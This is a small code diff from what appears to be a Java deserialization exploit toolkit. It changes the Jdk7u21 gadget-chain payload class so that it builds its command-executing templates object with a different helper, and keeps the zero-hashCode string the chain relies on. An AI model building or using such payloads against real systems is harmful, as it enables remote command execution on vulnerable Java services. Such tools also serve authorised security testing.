@@ -62,7 +62,7 @@ public class Jdk7u21 implements CommandObjectPayload<Object>
 {
 
 	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplates4Cmd(command);
 
 		// hashCode 为 0 的字符串
 		String zeroHashCodeStr = "f5a5a608";
